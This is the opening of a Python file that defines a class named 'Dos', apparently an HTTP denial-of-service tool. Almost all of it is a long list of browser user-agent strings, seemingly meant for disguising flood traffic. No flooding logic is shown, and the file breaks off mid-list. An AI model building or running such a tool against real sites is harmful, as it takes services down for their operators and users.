import requests
from urllib.parse import urlparse
import random
import time
import threading
from colorama import Style, Fore

class Dos:
    USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/88.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/89.0",
        	"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
	"Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0;  rv:11.0) like Gecko",
	"Mozilla/5.0 (compatible; MSIE 10.6; Windows NT 6.1; Trident/5.0; InfoPath.2; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727) 3gpp-gba UNTRUSTED/1.0",
	"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 7.0; InfoPath.3; .NET CLR 3.1.40767; Trident/6.0; en-IN)",
	"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)",
	"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)",
	"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)",
	"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/4.0; InfoPath.2; SV1; .NET CLR 2.0.50727; WOW64)",
	"Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)",
	"Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)",
	"Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)",
	"Mozilla/1.22 (compatible; MSIE 10.0; Windows 3.1)",
	"Mozilla/5.0 (Windows; U; MSIE 9.0; WIndows NT 9.0; en-US))",
	"Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0)",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; Media Center PC 6.0; InfoPath.3; MS-RTC LM 8; Zune 4.7)",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; Media Center PC 6.0; InfoPath.3; MS-RTC LM 8; Zune 4.7",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Zune 4.0; InfoPath.3; MS-RTC LM 8; .NET4.0C; .NET4.0E)",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; chromeframe/12.0.742.112)",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Zune 4.0; Tablet PC 2.0; InfoPath.3; .NET4.0C; .NET4.0E)",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; yie8)",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2; .NET CLR 1.1.4322; .NET4.0C; Tablet PC 2.0)",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; chromeframe/13.0.782.215)",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; chromeframe/11.0.696.57)",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0) chromeframe/10.0.648.205",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.1; SV1; .NET CLR 2.8.52393; WOW64; en-US)",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.1.76908; WOW64; en-US)",
	"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)",
	"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)",
	"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; InfoPath.1; SV1; .NET CLR 3.8.36217; WOW64; en-US)",
	"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; .NET CLR 2.7.58687; SLCC2; Media Center PC 5.0; Zune 3.4; Tablet PC 3.6; InfoPath.3)",
	"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.2; Trident/4.0; Media Center PC 4.0; SLCC1; .NET CLR 3.0.04320)",
	"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 1.1.4322)",
	"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; InfoPath.2; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727)",
	"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
	"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; SLCC1; .NET CLR 1.1.4322)",
	"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.0; Trident/4.0; InfoPath.1; SV1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 3.0.04506.30)",
	"Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.0; Trident/4.0; FBSMTWB; .NET CLR 2.0.34861; .NET CLR 3.0.3746.3218; .NET CLR 3.5.33652; msn OptimizedIE8;ENUS)",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.2; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; Media Center PC 6.0; InfoPath.2; MS-RTC LM 8)",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; Media Center PC 6.0; InfoPath.2; MS-RTC LM 8",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; Media Center PC 6.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C)",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.3; .NET4.0C; .NET4.0E; .NET CLR 3.5.30729; .NET CLR 3.0.30729; MS-RTC LM 8)",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Zune 3.0)",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; msn OptimizedIE8;ZHCN)",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MS-RTC LM 8; InfoPath.3; .NET4.0C; .NET4.0E) chromeframe/8.0.552.224",
	"Mozilla/4.0(compatible; MSIE 7.0b; Windows NT 6.0)",
	"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)",
	"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)",
	"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; Media Center PC 3.0; .NET CLR 1.0.3705; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.1)",
	"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; FDM; .NET CLR 1.1.4322)",
	"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; InfoPath.1; .NET CLR 2.0.50727)",
	"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; InfoPath.1)",
	"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; Alexa Toolbar; .NET CLR 2.0.50727)",
	"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; Alexa Toolbar)",
	"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
	"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.40607)",
	"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322)",
	"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.0.3705; Media Center PC 3.1; Alexa Toolbar; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
	"Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)",
	"Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; el-GR)",
	"Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 5.2)",
	"Mozilla/5.0 (MSIE 7.0; Macintosh; U; SunOS; X11; gu; SV1; InfoPath.2; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648)",
	"Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; WOW64; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; c .NET CLR 3.0.04506; .NET CLR 3.5.30707; InfoPath.1; el-GR)",
	"Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; c .NET CLR 3.0.04506; .NET CLR 3.5.30707; InfoPath.1; el-GR)",
	"Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; fr-FR)",
	"Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; en-US)",
	"Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.2; WOW64; .NET CLR 2.0.50727)",
	"Mozilla/5.0 (compatible; MSIE 7.0; Windows 98; SpamBlockerUtility 6.3.91; SpamBlockerUtility 6.2.91; .NET CLR 4.1.89;GB)",
	"Mozilla/4.79 [en] (compatible; MSIE 7.0; Windows NT 5.0; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648)",
	"Mozilla/4.0 (Windows; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
	"Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)",
	"Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1)",
	"Mozilla/4.0 (compatible;MSIE 7.0;Windows NT 6.0)",
	"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; Win64; x64; Trident/6.0; .NET4.0E; .NET4.0C)",
	"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; SLCC2; .NET CLR 2.0.50727; InfoPath.3; .NET4.0C; .NET4.0E; .NET CLR 3.5.30729; .NET CLR 3.0.30729; MS-RTC LM 8)",
	"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MS-RTC LM 8; .NET4.0C; .NET4.0E; InfoPath.3)",
	"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/6.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)",
	"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; chromeframe/12.0.742.100)",
	"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
	"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)",
	"Mozilla/4.0 (compatible; MSIE 6.01; Windows NT 6.0)",
	"Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.1; DigExt)",
	"Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.1)",
	"Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.0; YComp 5.0.2.6)",
	"Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.0; YComp 5.0.0.0) (Compatible;  ;  ; Trident/4.0)",
	"Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.0; YComp 5.0.0.0)",
	"Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.0; .NET CLR 1.1.4322)",
	"Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.0)",
	"Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 4.0; .NET CLR 1.0.2914)",
	"Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 4.0)",
	"Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98; YComp 5.0.0.0)",
	"Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98; Win 9x 4.90)",
	"Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)",
	"Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.1)",
	"Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.0; .NET CLR 1.0.3705)",
	"Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 4.0)",
	"Mozilla/5.0 (Windows; U; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
	"Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
	"Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4325)",
	"Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1)",
	"Mozilla/45.0 (compatible; MSIE 6.0; Windows NT 5.1)",
	"Mozilla/4.08 (compatible; MSIE 6.0; Windows NT 5.1)",
	"Mozilla/4.01 (compatible; MSIE 6.0; Windows NT 5.1)",
	"Mozilla/4.0 (X11; MSIE 6.0; i686; .NET CLR 1.1.4322; .NET CLR 2.0.50727; FDM)",
	"Mozilla/4.0 (Windows; MSIE 6.0; Windows NT 6.0)",
	"Mozilla/4.0 (Windows; MSIE 6.0; Windows NT 5.2)",
	"Mozilla/4.0 (Windows; MSIE 6.0; Windows NT 5.0)",
	"Mozilla/4.0 (Windows;  MSIE 6.0;  Windows NT 5.1;  SV1; .NET CLR 2.0.50727)",
	"Mozilla/4.0 (MSIE 6.0; Windows NT 5.1)",
	"Mozilla/4.0 (MSIE 6.0; Windows NT 5.0)",
	"Mozilla/4.0 (compatible;MSIE 6.0;Windows 98;Q312461)",
	"Mozilla/4.0 (Compatible; Windows NT 5.1; MSIE 6.0) (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
	"Mozilla/4.0 (compatible; U; MSIE 6.0; Windows NT 5.1) (Compatible;  ;  ; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)",
	"Mozilla/4.0 (compatible; U; MSIE 6.0; Windows NT 5.1)",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; InfoPath.3; Tablet PC 2.0)",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB6.5; QQDownload 534; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; SLCC2; .NET CLR 2.0.50727; Media Center PC 6.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
	"Mozilla/4.0 (compatible; MSIE 5.5b1; Mac_PowerPC)",
	"Mozilla/4.0 (compatible; MSIE 5.50; Windows NT; SiteKiosk 4.9; SiteCoach 1.0)",
	"Mozilla/4.0 (compatible; MSIE 5.50; Windows NT; SiteKiosk 4.8; SiteCoach 1.0)",
	"Mozilla/4.0 (compatible; MSIE 5.50; Windows NT; SiteKiosk 4.8)",
	"Mozilla/4.0 (compatible; MSIE 5.50; Windows 98; SiteKiosk 4.8)",
	"Mozilla/4.0 (compatible; MSIE 5.50; Windows 95; SiteKiosk 4.8)",
	"Mozilla/4.0 (compatible;MSIE 5.5; Windows 98)",
	"Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.1)",
	"Mozilla/4.0 (compatible; MSIE 5.5;)",
	"Mozilla/4.0 (Compatible; MSIE 5.5; Windows NT5.0; Q312461; SV1; .NET CLR 1.1.4322; InfoPath.2)",
	"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT5)",
	"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)",
	"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 6.1; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
	"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 6.1; chromeframe/12.0.742.100; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C)",
	"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30618)",
	"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.5)",
	"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.2; .NET CLR 1.1.4322; InfoPath.2; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; FDM)",
	"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.2; .NET CLR 1.1.4322) (Compatible;  ;  ; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)",
	"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.2; .NET CLR 1.1.4322)",
	"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
	"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
	"Mozilla/4.0 (compatible; MSIE 5.23; Mac_PowerPC)",
	"Mozilla/4.0 (compatible; MSIE 5.22; Mac_PowerPC)",
	"Mozilla/4.0 (compatible; MSIE 5.21; Mac_PowerPC)",
	"Mozilla/4.0 (compatible; MSIE 5.2; Mac_PowerPC)",
	"Mozilla/4.0 (compatible; MSIE 5.2; Mac_PowerPC)",
	"Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)",
	"Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC Mac OS; en)",
	"Mozilla/4.0 (compatible; MSIE 5.16; Mac_PowerPC)",
	"Mozilla/4.0 (compatible; MSIE 5.16; Mac_PowerPC)",
	"Mozilla/4.0 (compatible; MSIE 5.15; Mac_PowerPC)",
	"Mozilla/4.0 (compatible; MSIE 5.15; Mac_PowerPC)",
	"Mozilla/4.0 (compatible; MSIE 5.14; Mac_PowerPC)",
	"Mozilla/4.0 (compatible; MSIE 5.13; Mac_PowerPC)",
	"Mozilla/4.0 (compatible; MSIE 5.12; Mac_PowerPC)",
	"Mozilla/4.0 (compatible; MSIE 5.12; Mac_PowerPC)",
	"Mozilla/4.0 (compatible; MSIE 5.05; Windows NT 4.0)",
	"Mozilla/4.0 (compatible; MSIE 5.05; Windows NT 3.51)",
	"Mozilla/4.0 (compatible; MSIE 5.05; Windows 98; .NET CLR 1.1.4322)",
	"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT; YComp 5.0.0.0)",
	"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT; Hotbar 4.1.8.0)",
	"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT; DigExt)",
	"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT; .NET CLR 1.0.3705)",
	"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT)",
	"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; YComp 5.0.2.6; MSIECrawler)",
	"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; YComp 5.0.2.6; Hotbar 4.2.8.0)",
	"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; YComp 5.0.2.6; Hotbar 3.0)",
	"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; YComp 5.0.2.6)",
	"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; YComp 5.0.2.4)",
	"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; YComp 5.0.0.0; Hotbar 4.1.8.0)",
	"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; YComp 5.0.0.0)",
	"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; Wanadoo 5.6)",
	"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; Wanadoo 5.3; Wanadoo 5.5)",
	"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; Wanadoo 5.1)",
	"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; SV1; .NET CLR 1.1.4322; .NET CLR 1.0.3705; .NET CLR 2.0.50727)",
	"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; SV1)",
	"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; Q312461; T312461)",
	"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; Q312461)",
	"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; MSIECrawler)",
	"Mozilla/4.0 (compatible; MSIE 5.0b1; Mac_PowerPC)",
	"Mozilla/4.0 (compatible; MSIE 5.00; Windows 98)",
	"Mozilla/4.0(compatible; MSIE 5.0; Windows 98; DigExt)",
	"Mozilla/4.0 (compatible; MSIE 5.0; Windows NT;)",
	"Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; DigExt; YComp 5.0.2.6)",
	"Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; DigExt; YComp 5.0.2.5)",
	"Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; DigExt; YComp 5.0.0.0)",
	"Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; DigExt; Hotbar 4.1.8.0)",
	"Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; DigExt; Hotbar 3.0)",
	"Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; DigExt; .NET CLR 1.0.3705)",
	"Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; DigExt)",
	"Mozilla/4.0 (compatible; MSIE 5.0; Windows NT)",
	"Mozilla/4.0 (compatible; MSIE 5.0; Windows NT 6.0; Trident/4.0; InfoPath.1; SV1; .NET CLR 3.0.04506.648; .NET4.0C; .NET4.0E)",
	"Mozilla/4.0 (compatible; MSIE 5.0; Windows NT 5.9; .NET CLR 1.1.4322)",
	"Mozilla/4.0 (compatible; MSIE 5.0; Windows NT 5.2; .NET CLR 1.1.4322)",
	"Mozilla/4.0 (compatible; MSIE 5.0; Windows NT 5.0)",
	"Mozilla/4.0 (compatible; MSIE 5.0; Windows 98;)",
	"Mozilla/4.0 (compatible; MSIE 5.0; Windows 98; YComp 5.0.2.4)",
	"Mozilla/4.0 (compatible; MSIE 5.0; Windows 98; Hotbar 3.0)",
	"Mozilla/4.0 (compatible; MSIE 5.0; Windows 98; DigExt; YComp 5.0.2.6; yplus 1.0)",
	"Mozilla/4.0 (compatible; MSIE 5.0; Windows 98; DigExt; YComp 5.0.2.6)",
	"Mozilla/4.0 (compatible; MSIE 4.5; Windows NT 5.1; .NET CLR 2.0.40607)",
	"Mozilla/4.0 (compatible; MSIE 4.5; Windows 98; )",
	"Mozilla/4.0 (compatible; MSIE 4.5; Mac_PowerPC)",
	"Mozilla/4.0 (compatible; MSIE 4.5; Mac_PowerPC)",
	"Mozilla/4.0 PPC (compatible; MSIE 4.01; Windows CE; PPC; 240x320; Sprint:PPC-6700; PPC; 240x320)",
	"Mozilla/4.0 (compatible; MSIE 4.01; Windows NT)",
	"Mozilla/4.0 (compatible; MSIE 4.01; Windows NT 5.0)",
	"Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Sprint;PPC-i830; PPC; 240x320)",
	"Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Sprint; SCH-i830; PPC; 240x320)",
	"Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Sprint:SPH-ip830w; PPC; 240x320)",
	"Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Sprint:SPH-ip320; Smartphone; 176x220)",
	"Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Sprint:SCH-i830; PPC; 240x320)",
	"Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Sprint:SCH-i320; Smartphone; 176x220)",
	"Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Sprint:PPC-i830; PPC; 240x320)",
	"Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Smartphone; 176x220)",
	"Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320; Sprint:PPC-6700; PPC; 240x320)",
	"Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320; PPC)",
	"Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC)",
	"Mozilla/4.0 (compatible; MSIE 4.01; Windows CE)",
	"Mozilla/4.0 (compatible; MSIE 4.01; Windows 98; Hotbar 3.0)",
	"Mozilla/4.0 (compatible; MSIE 4.01; Windows 98; DigExt)",
	"Mozilla/4.0 (compatible; MSIE 4.01; Windows 98)",
	"Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)",
	"Mozilla/4.0 (compatible; MSIE 4.01; Mac_PowerPC)",
